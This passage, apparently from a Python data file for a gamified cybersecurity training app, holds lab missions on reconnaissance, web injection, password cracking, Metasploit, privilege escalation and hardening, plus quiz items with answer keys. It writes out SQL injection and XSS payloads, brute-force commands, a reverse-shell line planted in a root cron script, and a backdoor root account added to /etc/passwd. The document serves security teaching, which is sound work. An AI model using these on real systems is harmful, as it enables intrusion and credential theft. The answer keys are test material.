Before you can defend, you need to see yourself through an
attacker's eyes.

► OBJECTIVES:

  1. NETWORK FOOTPRINT:
     ip a                              # Your IPs and interfaces
     ip route                          # Default gateway
     cat /etc/resolv.conf              # DNS servers
     ss -tulnp                         # Open ports + processes

  2. SCAN YOURSELF:
     nmap -sV localhost                # Services on your machine
     nmap -sV -O localhost             # With OS detection
     nmap -sV -sC localhost            # With default scripts

  3. WHAT'S EXPOSED?
     # For each open port, ask:
     # - Do I need this service?
     # - Is it up to date?
     # - Is it configured securely?

  4. EXTERNAL VIEW:
     # What does YOUR machine look like from outside?
     # Check your public IP:
     curl ifconfig.me 2>/dev/null || echo "No internet access"

  5. DOCUMENT EVERYTHING:
     # Create a recon report:
     echo "=== Self-Scan Report ===" > ~/self_scan.txt
     echo "Date: $(date)" >> ~/self_scan.txt
     echo "" >> ~/self_scan.txt
     ip a >> ~/self_scan.txt
     echo "" >> ~/self_scan.txt
     ss -tulnp >> ~/self_scan.txt

► HACKER MINDSET:
  Every listening service is an attack surface. If you don't
  need it, disable it. The fewer doors you have, the fewer
  an attacker can try to open.""",
        "bonus": "Create a full self-assessment: list every open port, identify the service, check if it's the latest version, and rate the risk (low/medium/high). Save to ~/self_assessment.txt",
        "bonus_xp": 10,
    },
    {
        "id": "rc02", "tree": "recon", "tier": 2, "xp": 45,
        "title": "OSINT Operator",
        "brief": "Gather intelligence using public sources",
        "mission": """═══ MISSION — OSINT Operator ═══

The best reconnaissance is passive — no direct contact with
the target. Use only publicly available information.

► OBJECTIVES (use a domain YOU own or have permission for):

  1. DNS INTELLIGENCE:
     whois example.com                  # Registration info
     dig example.com ANY                # All DNS records
     dnsrecon -d example.com -t std     # Standard DNS recon

  2. EMAIL HARVESTING:
     theHarvester -d example.com -l 100 -b all
     # Searches Google, Bing, LinkedIn, etc. for emails and hosts

  3. SUBDOMAIN ENUMERATION:
     # Find hidden subdomains:
     fierce --domain example.com
     # Check for subdomain takeover possibilities

  4. WEB TECHNOLOGY FINGERPRINTING:
     whatweb example.com                 # Identify web technologies
     curl -I example.com                # HTTP response headers

  5. GOOGLE DORKING (powerful search tricks):
     # site:example.com                  → only results from that site
     # filetype:pdf site:example.com    → find PDFs
     # intitle:"index of" site:example.com → open directories
     # inurl:admin site:example.com     → admin pages
     # "password" filetype:txt site:example.com → leaked passwords

  6. TOOLS AVAILABLE ON PARROT:
     recon-ng              # OSINT framework (modular)
     maltego               # Visual link analysis
     spiderfoot            # Automated OSINT scanner

► ⚠️ OSINT is legal (public info) but USE IT RESPONSIBLY.
  Don't stalk people. Don't gather info for malicious purposes.""",
        "bonus": "Run a full OSINT assessment on a domain you own: DNS, WHOIS, email harvesting, subdomain enum, technology fingerprinting. Create ~/osint_report.txt with all findings organized by category.",
        "bonus_xp": 15,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  WEB HACKING                                 ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "web01", "tree": "webhack", "tier": 1, "xp": 25,
        "title": "Web Recon",
        "brief": "Enumerate web servers and find hidden content",
        "mission": """═══ MISSION — Web Recon ═══

Before attacking a web app, you need to map it completely.

► OBJECTIVES:

  1. HTTP BASICS:
     curl http://target.com                    # GET request
     curl -I http://target.com                 # Headers only
     curl -X POST -d "user=admin" http://target.com/login
     curl -v http://target.com                 # Verbose (see everything)

  2. INSPECT RESPONSE HEADERS:
     curl -I http://target.com | grep -i server    # Web server type
     curl -I http://target.com | grep -i x-powered  # Technology stack
     # Look for: Server, X-Powered-By, Set-Cookie, Content-Security-Policy

  3. DIRECTORY/FILE ENUMERATION:
     # Gobuster — fast directory bruter:
     gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

     # Dirb — another directory scanner:
     dirb http://target.com /usr/share/wordlists/dirb/common.txt

     # Common interesting paths:
     # /robots.txt    → Tells search engines what to ignore (reveals hidden paths!)
     # /sitemap.xml   → Site structure
     # /.git/         → Exposed git repo (source code leak!)
     # /admin/        → Admin panel
     # /backup/       → Backup files
     # /wp-admin/     → WordPress admin

  4. CHECK robots.txt:
     curl http://target.com/robots.txt
     # Disallowed paths are often the most interesting ones!

  5. TECHNOLOGY FINGERPRINTING:
     whatweb http://target.com
     # Identifies: CMS, web server, programming language,
     #             JavaScript frameworks, analytics tools

  6. SSL/TLS CHECKING:
     # Check certificate info:
     echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -text
     # Look for: expiration, issuer, subject alternative names (more domains!)

► ⚠️ Only scan web servers you OWN or have authorized access to.
  Set up a local practice target (DVWA, Juice Shop, WebGoat).""",
        "bonus": "Set up DVWA (Damn Vulnerable Web Application) in your lab: sudo apt install dvwa OR use Docker. Run a full web recon against it. Document findings in ~/web_recon.txt",
        "bonus_xp": 15,
    },
    {
        "id": "web02", "tree": "webhack", "tier": 2, "xp": 50,
        "title": "Injection Master",
        "brief": "Understand SQL injection and XSS",
        "mission": """═══ MISSION — Injection Master ═══

Injection flaws are consistently in the OWASP Top 10.

► ⚠️ ONLY practice on YOUR OWN lab targets (DVWA, Juice Shop, etc.)

► OBJECTIVES:

  1. SQL INJECTION — WHAT IS IT?
     # Normal query: SELECT * FROM users WHERE id = '1'
     # Injected:     SELECT * FROM users WHERE id = '1' OR '1'='1'
     # The OR '1'='1' is ALWAYS true, so it returns ALL users!

     # In a login form:
     # Username: admin' --
     # Password: anything
     # Query becomes: SELECT * FROM users WHERE user='admin' --' AND pass='anything'
     # The -- comments out the password check!

  2. SQL INJECTION TYPES:
     # Union-based: ' UNION SELECT username,password FROM users --
     # Error-based: triggers database errors that leak info
     # Blind: true/false responses (slower but works when no output)
     # Time-based: ' OR IF(1=1, SLEEP(5), 0) -- (delays = true)

  3. SQLMAP — automated SQL injection:
     # Test a URL parameter:
     sqlmap -u "http://target.com/page?id=1" --batch
     # Dump the database:
     sqlmap -u "http://target.com/page?id=1" --dbs
     sqlmap -u "http://target.com/page?id=1" -D dbname --tables
     sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

  4. CROSS-SITE SCRIPTING (XSS):
     # Reflected XSS: payload in URL, reflected back to user
     # Stored XSS: payload saved in database, shown to all users
     # DOM XSS: payload manipulates client-side JavaScript

     # Test payloads:
     <script>alert('XSS')</script>
     <img src=x onerror=alert('XSS')>
     <svg onload=alert('XSS')>

  5. DEFENDING AGAINST INJECTION:
     # SQL injection: use parameterized queries / prepared statements
     # XSS: input validation, output encoding, Content-Security-Policy
     # General: never trust user input, always validate server-side

  6. OWASP TOP 10 (memorize these):
     A01: Broken Access Control
     A02: Cryptographic Failures
     A03: Injection
     A04: Insecure Design
     A05: Security Misconfiguration
     A06: Vulnerable Components
     A07: Auth Failures
     A08: Data Integrity Failures
     A09: Logging Failures
     A10: Server-Side Request Forgery (SSRF)

► Practice these ONLY on authorized targets like DVWA.""",
        "bonus": "In DVWA (set to low security), successfully perform: 1) SQL injection to extract usernames, 2) Reflected XSS, 3) Stored XSS. Document each attack AND the fix in ~/injection_lab.txt",
        "bonus_xp": 20,
    },
    {
        "id": "web03", "tree": "webhack", "tier": 3, "xp": 60,
        "title": "Burp Suite Operator",
        "brief": "Intercept and modify web traffic",
        "mission": """═══ MISSION — Burp Suite Operator ═══

Burp Suite is the web hacker's best friend. It sits between your
browser and the target, letting you intercept and modify everything.

► OBJECTIVES:

  1. LAUNCH AND CONFIGURE:
     burpsuite &
     # Set up browser proxy: 127.0.0.1:8080
     # In Firefox: Settings → Network → Manual Proxy → 127.0.0.1:8080
     # Or use Burp's built-in Chromium browser

  2. PROXY — intercept requests:
     # Turn intercept ON
     # Browse to your target
     # Every request stops for you to inspect/modify
     # Forward = send it, Drop = block it

  3. REPEATER — modify and resend:
     # Right-click any request → Send to Repeater
     # Modify parameters, headers, body
     # Hit Send and compare responses
     # Perfect for testing injection payloads manually

  4. INTRUDER — automated attacks:
     # Right-click → Send to Intruder
     # Mark injection points with §
     # Load a wordlist for each position
     # Attack types:
     #   Sniper: one payload, one position at a time
     #   Battering ram: same payload, all positions
     #   Pitchfork: paired payloads
     #   Cluster bomb: all combinations

  5. USEFUL TECHNIQUES:
     # Modify cookies to test access control
     # Change user-agent to bypass restrictions
     # Replay requests with different parameters
     # Test for hidden parameters

  6. DECODER — encode/decode:
     # URL encoding, Base64, HTML entities
     # Useful for crafting payloads that bypass filters

► HACKER MINDSET:
  Burp Suite lets you see the REAL communication between browser
  and server. Client-side validation? Bypassed. Hidden form fields?
  Visible and editable. This is why server-side validation is
  non-negotiable.""",
        "bonus": "Using Burp Suite against DVWA: intercept a login request, send it to Repeater, modify the credentials, and observe the different responses. Then use Intruder to brute force the login with a small wordlist. Document in ~/burp_lab.txt",
        "bonus_xp": 20,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  PASSWORD ATTACKS                            ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "pw01", "tree": "passwords", "tier": 1, "xp": 25,
        "title": "Password Theory",
        "brief": "How passwords work and how they're stored",
        "mission": """═══ MISSION — Password Theory ═══

Before cracking, understand how passwords are protected.

► OBJECTIVES:

  1. HOW LINUX STORES PASSWORDS:
     cat /etc/passwd        # User info (readable by all)
     sudo cat /etc/shadow   # Password HASHES (root only)

     # /etc/shadow format:
     # username:$type$salt$hash:lastchange:min:max:warn:inactive:expire
     #
     # $6$ = SHA-512 (most common on modern Linux)
     # The salt makes each hash unique even for the same password

  2. WHY HASHING MATTERS:
     # Same password, no salt:   always same hash (rainbow table attack)
     # Same password, with salt: different hash every time!
     # That's why /etc/shadow uses salted hashes

  3. COMMON ATTACK TYPES:
     # Dictionary attack: try every word in a wordlist
     # Brute force: try every possible combination (slow!)
     # Rule-based: apply rules to wordlist (password → P@ssw0rd)
     # Rainbow tables: precomputed hash→password lookup
     # Credential stuffing: use leaked credentials from other breaches

  4. EXPLORE WORDLISTS:
     ls /usr/share/wordlists/
     wc -l /usr/share/wordlists/rockyou.txt
     head -50 /usr/share/wordlists/rockyou.txt
     ls /usr/share/wordlists/dirb/
     ls /usr/share/wordlists/dirbuster/
     # SecLists (if installed):
     ls /usr/share/seclists/ 2>/dev/null

  5. CUSTOM WORDLISTS:
     # CeWL — generate wordlist from a website:
     cewl http://target.com -w ~/custom_wordlist.txt
     # Crunch — generate brute force patterns:
     crunch 6 8 abcdef123 -o ~/crunch_wordlist.txt
     # First number = min length, second = max length

  6. PASSWORD POLICIES (defensive side):
     # Good policy: 12+ chars, mixed case, numbers, symbols
     # Better: passphrase ("correct horse battery staple")
     # Best: random generated + password manager
     # Enable: account lockout, MFA, rate limiting

► WHY THIS MATTERS:
  The #1 way attackers get in? Weak passwords and credential reuse.
  Understanding attacks helps you build better defenses.""",
        "bonus": "Generate 3 custom wordlists: 1) CeWL from a website, 2) Crunch for 6-digit PINs, 3) A manual list of 20 common passwords for your locale. Save all to ~/wordlists/",
        "bonus_xp": 10,
    },
    {
        "id": "pw02", "tree": "passwords", "tier": 2, "xp": 45,
        "title": "Crack & Defend",
        "brief": "Crack passwords with Hydra and John, then harden",
        "mission": """═══ MISSION — Crack & Defend ═══

Attack passwords, then build defenses. Both sides of the coin.

► ⚠️ ONLY attack YOUR OWN systems in YOUR lab.

► PART 1 — OFFLINE CRACKING (hash files):

  1. JOHN THE RIPPER:
     # Create test hashes:
     sudo useradd -m -s /bin/bash testuser1
     sudo passwd testuser1   # Set to "password123"
     sudo useradd -m -s /bin/bash testuser2
     sudo passwd testuser2   # Set to "letmein"

     # Extract hashes:
     sudo unshadow /etc/passwd /etc/shadow > ~/hashes.txt

     # Crack with wordlist:
     john --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes.txt

     # Show cracked:
     john --show ~/hashes.txt

     # Use rules (mutations):
     john --wordlist=/usr/share/wordlists/rockyou.txt --rules ~/hashes.txt

  2. HASHCAT:
     # Extract just the hash from /etc/shadow
     # Mode 1800 = SHA-512crypt ($6$)
     hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

► PART 2 — ONLINE CRACKING (live services):

  3. HYDRA — network login cracker:
     # SSH brute force (against YOUR test server):
     hydra -l testuser1 -P /usr/share/wordlists/rockyou.txt \\
       ssh://127.0.0.1 -t 4 -V

     # HTTP form brute force:
     hydra -l admin -P wordlist.txt \\
       target.com http-post-form \\
       "/login:user=^USER^&pass=^PASS^:Invalid"

     # FTP:
     hydra -l admin -P wordlist.txt ftp://target.com

► PART 3 — DEFEND AGAINST THESE ATTACKS:

  4. INSTALL AND CONFIGURE FAIL2BAN:
     sudo apt install fail2ban
     sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
     sudo nano /etc/fail2ban/jail.local
     # Set: bantime = 3600 (1 hour)
     #      findtime = 600 (10 min window)
     #      maxretry = 3
     sudo systemctl enable --now fail2ban
     sudo fail2ban-client status
     sudo fail2ban-client status sshd

  5. CHECK FOR LOCKOUTS:
     # Run Hydra again — does fail2ban catch it?
     sudo fail2ban-client status sshd   # See banned IPs
     sudo tail -f /var/log/fail2ban.log # Watch bans happen

  6. CLEAN UP TEST USERS:
     sudo userdel -r testuser1
     sudo userdel -r testuser2""",
        "bonus": "Set up fail2ban, then run Hydra against your own SSH. Verify fail2ban bans the IP. Check /var/log/fail2ban.log. Document the attack AND defense in ~/password_defense.txt",
        "bonus_xp": 15,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  SYSTEM EXPLOITATION                         ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "ex01", "tree": "exploit", "tier": 2, "xp": 45,
        "title": "Metasploit Academy",
        "brief": "Learn the exploitation framework",
        "mission": """═══ MISSION — Metasploit Academy ═══

Metasploit is the industry standard for exploitation.

► ⚠️ ONLY use against machines YOU own. Set up Metasploitable 2
  as a practice target in your Hyper-V lab.

► OBJECTIVES:

  1. START METASPLOIT:
     sudo msfdb init            # Initialize the database
     msfconsole                  # Launch the console

  2. NAVIGATE:
     help                        # Show commands
     search type:exploit platform:linux
     search cve:2021             # Search by CVE
     info exploit/unix/ftp/vsftpd_234_backdoor
     use exploit/unix/ftp/vsftpd_234_backdoor
     show options                # What needs to be configured?
     set RHOSTS 192.168.1.100   # Set target
     show payloads               # Available payloads
     run                         # Execute the exploit

  3. KEY CONCEPTS:
     # Exploit: the code that attacks a vulnerability
     # Payload: what runs AFTER successful exploitation
     # Meterpreter: advanced payload with shell, file transfer, etc.
     # Auxiliary: scanning and information-gathering modules
     # Post: post-exploitation modules

  4. USEFUL AUXILIARY MODULES:
     use auxiliary/scanner/portscan/tcp
     use auxiliary/scanner/smb/smb_version
     use auxiliary/scanner/ssh/ssh_login
     use auxiliary/scanner/http/http_version

  5. METERPRETER COMMANDS (after exploitation):
     sysinfo                # Target system info
     getuid                 # Current user
     pwd / ls               # Navigate filesystem
     download /etc/passwd   # Download files
     upload tool.sh /tmp/   # Upload files
     shell                  # Drop to system shell
     hashdump               # Dump password hashes
     bg                     # Background the session

  6. IMPORTANT:
     sessions               # List active sessions
     sessions -i 1          # Interact with session 1
     exit                   # Close msfconsole

► SET UP A TARGET:
  Download Metasploitable 2 and import it into Hyper-V.
  It's intentionally vulnerable — perfect for learning.""",
        "bonus": "Set up Metasploitable 2 in Hyper-V. Run an nmap scan against it, then use Metasploit to exploit at least one vulnerability. Document the full attack chain in ~/msf_lab.txt",
        "bonus_xp": 20,
    },
    {
        "id": "ex02", "tree": "exploit", "tier": 3, "xp": 60,
        "title": "Privilege Escalation",
        "brief": "Go from regular user to root",
        "mission": """═══ MISSION — Privilege Escalation ═══

You got a shell. Now become root. This is the art of privesc.

► ⚠️ Practice on YOUR machines or intentionally vulnerable VMs.

► OBJECTIVES:

  1. LINUX PRIVESC CHECKLIST:
     # Who am I?
     whoami && id
     # What can I sudo?
     sudo -l
     # Kernel version (check for kernel exploits):
     uname -a
     cat /etc/os-release
     # SUID binaries:
     find / -perm -4000 -type f 2>/dev/null
     # Writable files in sensitive locations:
     find /etc -writable -type f 2>/dev/null
     # Cron jobs:
     cat /etc/crontab
     ls -la /etc/cron.d/
     crontab -l
     sudo crontab -l

  2. AUTOMATED ENUMERATION TOOLS:
     # LinPEAS (Linux Privilege Escalation Awesome Script):
     # Download to your Parrot machine, then transfer to target:
     curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
     chmod +x linpeas.sh
     ./linpeas.sh | tee linpeas_output.txt

     # LinEnum:
     # Similar automated enumeration script

  3. COMMON PRIVESC VECTORS:
     # a) Sudo misconfigurations:
     sudo -l
     # If you see: (ALL) NOPASSWD: /usr/bin/vim
     # → sudo vim -c '!bash'   ← instant root shell!
     # Check GTFOBins for EVERY sudo-allowed binary

     # b) SUID abuse:
     # If /usr/bin/find has SUID:
     find . -exec /bin/bash -p \\;

     # c) Writable cron scripts:
     # If root's cron runs /opt/backup.sh and you can write to it:
     echo "/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /opt/backup.sh

     # d) Writable /etc/passwd:
     # Generate a password hash:
     openssl passwd -1 "hacked"
     # Add a root user:
     echo 'hacker:HASH_HERE:0:0::/root:/bin/bash' >> /etc/passwd

  4. PRACTICE:
     # On your Parrot box:
     sudo -l                   # What can you sudo?
     find / -perm -4000 2>/dev/null   # Check SUID
     # Look up each result on GTFOBins.github.io

  5. DEFEND AGAINST PRIVESC:
     - Minimize sudo access (principle of least privilege)
     - Remove unnecessary SUID bits
     - Audit cron jobs and their file permissions
     - Keep the kernel updated
     - Monitor /etc/passwd and /etc/shadow for changes (use AIDE)""",
        "bonus": "Run linpeas.sh on your Parrot box. Read the entire output. Identify any real findings. Fix at least 2 issues it flags. Document before/after in ~/privesc_audit.txt",
        "bonus_xp": 20,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  DEFENSIVE SECURITY                          ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "def01", "tree": "defense", "tier": 1, "xp": 30,
        "title": "Firewall Fortress",
        "brief": "Configure UFW and iptables",
        "mission": """═══ MISSION — Firewall Fortress ═══

Firewalls are your first line of defense.

► OBJECTIVES:

  1. UFW (Uncomplicated Firewall):
     sudo ufw status verbose
     sudo ufw default deny incoming
     sudo ufw default allow outgoing
     sudo ufw enable

     # Allow specific services:
     sudo ufw allow 22/tcp           # SSH
     sudo ufw allow 80/tcp           # HTTP
     sudo ufw allow 443/tcp          # HTTPS
     sudo ufw allow from 192.168.1.0/24  # Allow entire subnet

     # Deny specific:
     sudo ufw deny 23/tcp            # Block Telnet
     sudo ufw deny from 10.0.0.5     # Block specific IP

     # Delete rules:
     sudo ufw status numbered
     sudo ufw delete 3               # Delete rule #3

  2. IPTABLES (advanced — UFW is a wrapper for this):
     sudo iptables -L -v -n          # List all rules
     sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
     sudo iptables -A INPUT -p tcp --dport 23 -j DROP
     sudo iptables -A INPUT -j LOG --log-prefix "DROPPED: "
     # Save rules:
     sudo iptables-save > /etc/iptables.rules

  3. VERIFY YOUR FIREWALL:
     # From another machine, scan yourself:
     nmap -sV YOUR_PARROT_IP
     # Compare: what's open WITH firewall vs without?

  4. LOG ANALYSIS:
     sudo tail -f /var/log/ufw.log
     # Watch for blocked connection attempts

► WHY THIS MATTERS:
  A firewall without rules is like a locked door with no walls.
  Configure it to allow ONLY what you need.""",
        "bonus": "Configure UFW to: allow SSH from only your subnet, allow HTTP/HTTPS from anywhere, deny everything else. Verify with nmap from another machine. Document rules in ~/firewall_config.txt",
        "bonus_xp": 10,
    },
    {
        "id": "def02", "tree": "defense", "tier": 2, "xp": 50,
        "title": "IDS Guardian",
        "brief": "Deploy Suricata intrusion detection",
        "mission": """═══ MISSION — IDS Guardian ═══

An IDS watches your network and alerts on threats.

► OBJECTIVES:

  1. INSTALL SURICATA:
     sudo apt install suricata
     suricata --build-info | head -5    # Verify install

  2. CONFIGURE:
     sudo nano /etc/suricata/suricata.yaml
     # Set HOME_NET to your lab subnet: "192.168.1.0/24"
     # Set default-rule-path: /var/lib/suricata/rules
     # Set interface under af-packet section

  3. UPDATE RULES:
     sudo suricata-update
     sudo suricata-update list-sources        # Available rule sources
     sudo suricata-update enable-source et/open # Enable ET Open rules
     sudo suricata-update                      # Download rules

  4. START MONITORING:
     sudo suricata -c /etc/suricata/suricata.yaml -i eth0
     # Or as a service:
     sudo systemctl enable --now suricata

  5. VIEW ALERTS:
     sudo tail -f /var/log/suricata/fast.log
     sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool

  6. TRIGGER ALERTS (from another machine):
     nmap -sV YOUR_PARROT_IP               # Port scan
     curl "http://YOUR_IP/../../etc/passwd" # Directory traversal
     # Watch Suricata light up!

  7. WRITE CUSTOM RULES:
     # Rule format:
     # action proto src_ip src_port -> dst_ip dst_port (options)
     # Example — detect SSH brute force:
     # alert tcp any any -> $HOME_NET 22 (msg:"SSH brute force"; \\
     #   flow:to_server; threshold:type both,track by_src,count 5,seconds 60; \\
     #   sid:1000001; rev:1;)

     # Save custom rules in /var/lib/suricata/rules/local.rules
     # Restart Suricata to load them

► HACKER MINDSET:
  IDS evasion is a real skill. Slow scans, encrypted payloads,
  fragmented packets — attackers have tricks. Understanding the
  IDS helps you both detect better AND test evasion.""",
        "bonus": "Write 3 custom Suricata rules: 1) Detect port scans, 2) Detect SSH brute force, 3) Detect suspicious HTTP requests. Test each one and verify they fire. Document in ~/ids_rules.txt",
        "bonus_xp": 20,
    },
    {
        "id": "def03", "tree": "defense", "tier": 3, "xp": 60,
        "title": "Hardening Master",
        "brief": "Full system hardening — kernel, SSH, services",
        "mission": """═══ MISSION — Hardening Master ═══

Lock down everything. Defense in depth.

► OBJECTIVES:

  1. KERNEL HARDENING (sysctl):
     sudo nano /etc/sysctl.conf
     # Add these lines:
     net.ipv4.ip_forward = 0
     net.ipv4.tcp_syncookies = 1
     net.ipv4.conf.all.rp_filter = 1
     net.ipv4.conf.all.accept_redirects = 0
     net.ipv4.conf.all.send_redirects = 0
     net.ipv4.icmp_echo_ignore_broadcasts = 1
     kernel.randomize_va_space = 2
     kernel.dmesg_restrict = 1
     kernel.kptr_restrict = 2
     # Apply:
     sudo sysctl -p

  2. SSH HARDENING:
     sudo nano /etc/ssh/sshd_config
     # Set:
     PermitRootLogin no
     PasswordAuthentication no    # (after setting up SSH keys!)
     MaxAuthTries 3
     Port 2222
     AllowUsers captain
     Protocol 2
     # Restart:
     sudo systemctl restart sshd

  3. SERVICE MINIMIZATION:
     # List all services:
     sudo systemctl list-units --type=service --state=running
     # Disable what you don't need:
     sudo systemctl disable --now SERVICE_NAME
     # If you don't use bluetooth:
     sudo systemctl disable --now bluetooth

  4. AUTOMATIC UPDATES:
     sudo apt install unattended-upgrades
     sudo dpkg-reconfigure -plow unattended-upgrades

  5. FILE INTEGRITY MONITORING:
     sudo apt install aide
     sudo aideinit
     # After initialization:
     sudo aide --check    # Compare current state to baseline

  6. AUDIT LOGGING:
     sudo apt install auditd
     sudo systemctl enable --now auditd
     # Monitor /etc/shadow changes:
     sudo auditctl -w /etc/shadow -p wa -k shadow_changes
     # Check audit log:
     sudo ausearch -k shadow_changes

► FINAL CHECK — run your audit script from the Shell Scripter
  quest and verify everything is hardened.""",
        "bonus": "Apply ALL hardening steps. Then run linpeas.sh again and compare the output to your first run. Document improvements in ~/hardening_report.txt",
        "bonus_xp": 20,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  SECURITY FRAMEWORKS                         ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "gov01", "tree": "governance", "tier": 1, "xp": 25,
        "title": "CIA & NIST Basics",
        "brief": "Security frameworks every pro must know",
        "mission": """═══ MISSION — CIA & NIST Basics ═══

Theory matters. These frameworks guide the entire industry.

► OBJECTIVES:

  1. THE CIA TRIAD (recap + depth):
     CONFIDENTIALITY — Keep secrets secret
       Controls: encryption, access controls, MFA, classification
       Attacks: data breaches, eavesdropping, social engineering
       Metrics: how many unauthorized accesses? Data leak incidents?

     INTEGRITY — Keep data trustworthy
       Controls: hashing, digital signatures, version control, backups
       Attacks: MITM, data tampering, SQL injection
       Metrics: integrity check failures? Unauthorized changes?

     AVAILABILITY — Keep systems running
       Controls: redundancy, backups, load balancing, DDoS protection
       Attacks: DDoS, ransomware, hardware failure
       Metrics: uptime percentage? MTTR (mean time to recover)?

  2. NIST CYBERSECURITY FRAMEWORK (CSF):
     Five core functions — memorize these:

     IDENTIFY   — What do we need to protect?
       Asset inventory, risk assessment, business environment
       "What do we have and what could go wrong?"

     PROTECT    — How do we prevent attacks?
       Access control, training, data security, maintenance
       "Build the walls and train the guards"

     DETECT     — How do we catch attacks in progress?
       Monitoring, anomaly detection, continuous security monitoring
       "Watch for intruders 24/7"

     RESPOND    — What do we do when attacked?
       Incident response plan, communications, analysis, mitigation
       "The fire drill for when things go wrong"

     RECOVER    — How do we get back to normal?
       Recovery planning, improvements, communications
       "Rebuild and learn from the incident"

  3. CVE — Common Vulnerabilities and Exposures:
     # CVE-YYYY-NNNNN format
     # Example: CVE-2021-44228 (Log4Shell)

     # Search CVEs:
     # https://cve.mitre.org
     # https://nvd.nist.gov

     # On your system, check for known vulns:
     nmap --script vuln localhost

  4. CVSS — Common Vulnerability Scoring System:
     0.0       None
     0.1-3.9   Low
     4.0-6.9   Medium
     7.0-8.9   High
     9.0-10.0  Critical

     # Log4Shell (CVE-2021-44228) scored 10.0 — maximum severity

  5. OTHER IMPORTANT FRAMEWORKS:
     MITRE ATT&CK  — Catalog of attacker techniques
     OWASP Top 10   — Top web application vulnerabilities
     CIS Benchmarks — Hardening guides for specific OS/software
     ISO 27001      — Information security management standard

► WHY THIS MATTERS:
  Every security job posting mentions these frameworks. SOC
  analysts map detections to MITRE ATT&CK. Auditors check
  against NIST CSF. Pentesters reference OWASP Top 10.""",
        "bonus": "Map your Parrot OS lab to the NIST CSF: for each function (Identify, Protect, Detect, Respond, Recover), list what you've already done and what gaps remain. Save to ~/nist_assessment.txt",
        "bonus_xp": 10,
    },
    {
        "id": "gov02", "tree": "governance", "tier": 2, "xp": 40,
        "title": "CVE Hunter",
        "brief": "Find, read, and assess vulnerabilities",
        "mission": """═══ MISSION — CVE Hunter ═══

Real security work means tracking and assessing vulnerabilities.

► OBJECTIVES:

  1. FIND CVEs FOR YOUR SOFTWARE:
     # What's installed?
     dpkg -l | head -30
     apt list --installed 2>/dev/null | wc -l

     # Check a specific package version:
     apt show openssh-server | grep Version
     # Now search: "openssh [version] CVE"

  2. SEARCH CVE DATABASES:
     # NVD (National Vulnerability Database):
     # https://nvd.nist.gov/vuln/search

     # MITRE CVE:
     # https://cve.mitre.org

     # Exploit-DB (exploits for CVEs):
     searchsploit openssh
     searchsploit apache 2.4
     searchsploit linux kernel

  3. READ A CVE ENTRY:
     # Key fields:
     # - CVE ID: unique identifier
     # - Description: what the vulnerability is
     # - CVSS Score: severity (0-10)
     # - Affected versions: what's vulnerable
     # - References: patches, advisories, exploits
     # - CWE: weakness category (e.g., CWE-79 = XSS)

  4. VULNERABILITY SCANNING:
     # Nmap vuln scripts:
     nmap --script vuln localhost
     nmap --script vuln 192.168.1.0/24

     # Nikto (web vulnerability scanner):
     nikto -h http://target.com

  5. ASSESS AND PRIORITIZE:
     # Not all CVEs are equal. Prioritize by:
     # 1. CVSS score (severity)
     # 2. Exploitability (is there a public exploit?)
     # 3. Exposure (is the service internet-facing?)
     # 4. Asset value (how critical is this system?)

  6. PATCH MANAGEMENT:
     # Check for available updates:
     sudo apt update
     apt list --upgradable
     # Apply security updates:
     sudo apt upgrade
     # Check what changed:
     cat /var/log/apt/history.log | tail -30

► HACKER MINDSET:
  Attackers check CVE databases too. When a new CVE drops, there's
  a race: can defenders patch faster than attackers can exploit?
  That window between disclosure and patching is when most attacks
  happen.""",
        "bonus": "Scan your Parrot machine and lab with nmap --script vuln. For every finding, look up the CVE, check the CVSS score, and determine if you're actually affected. Write a vulnerability report in ~/vuln_report.txt",
        "bonus_xp": 15,
    },
]


# ══════════════════════════════════════════════════════
# SIDE QUESTS (exams / knowledge checks)
# ══════════════════════════════════════════════════════

SIDE_QUESTS = [
    {
        "id": "exam_linux",
        "title": "🧪 Linux Fundamentals Exam",
        "xp": 30,
        "required_tree": "linux",
        "questions": [
            {"q": "What command shows your current working directory?", "options": ["ls", "pwd", "cd", "whoami"], "answer": 1},
            {"q": "Which directory stores system configuration files?", "options": ["/home", "/tmp", "/etc", "/bin"], "answer": 2},
            {"q": "What does chmod 755 mean?", "options": ["Owner: rwx, Group: r-x, Others: r-x", "Owner: rwx, Group: rwx, Others: r-x", "Owner: rw-, Group: r--, Others: r--", "Owner: rwx, Group: rw-, Others: rw-"], "answer": 0},
            {"q": "What does the SUID bit do?", "options": ["Makes file read-only", "Runs file as the file owner", "Deletes file after use", "Encrypts the file"], "answer": 1},
            {"q": "Which command finds files with SUID set?", "options": ["grep -r suid /", "find / -perm -4000", "ls -suid /", "chmod --find-suid /"], "answer": 1},
            {"q": "What file stores password hashes on Linux?", "options": ["/etc/passwd", "/etc/shadow", "/etc/hashes", "/var/log/auth"], "answer": 1},
            {"q": "What does 'sudo -l' show you?", "options": ["Last login time", "System load", "What you can run with sudo", "Listening ports"], "answer": 2},
            {"q": "Which directory is world-writable by default?", "options": ["/etc", "/home", "/tmp", "/root"], "answer": 2},
        ],
    },
    {
        "id": "exam_network",
        "title": "🧪 Networking Exam",
        "xp": 30,
        "required_tree": "networking",
        "questions": [
            {"q": "What layer of the OSI model does TCP operate at?", "options": ["Layer 2", "Layer 3", "Layer 4", "Layer 7"], "answer": 2},
            {"q": "What port does SSH use by default?", "options": ["21", "22", "80", "443"], "answer": 1},
            {"q": "What does a SYN packet indicate?", "options": ["Connection closing", "Data transfer", "Connection request", "Error message"], "answer": 2},
